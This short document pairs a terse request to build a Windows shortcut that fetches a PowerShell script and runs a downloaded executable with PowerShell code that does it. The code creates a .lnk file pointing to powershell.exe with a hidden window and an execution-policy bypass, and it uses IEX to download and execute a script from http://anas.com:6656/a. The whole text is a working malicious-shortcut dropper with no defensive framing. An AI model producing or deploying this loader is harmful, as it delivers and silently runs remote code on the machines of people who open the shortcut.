
create a .lnk that grep .ps1 that download .exe and run it 
```powershell 
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Link.lnk")
$Shortcut.TargetPath = "powershell.exe"
$command = 'IEX ((new-object net.webclient).downloadstring(''http://anas.com:6656/a''))'
$Shortcut.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"${command}`""
$Shortcut.IconLocation = "powershell.exe"
$Shortcut.Save()
```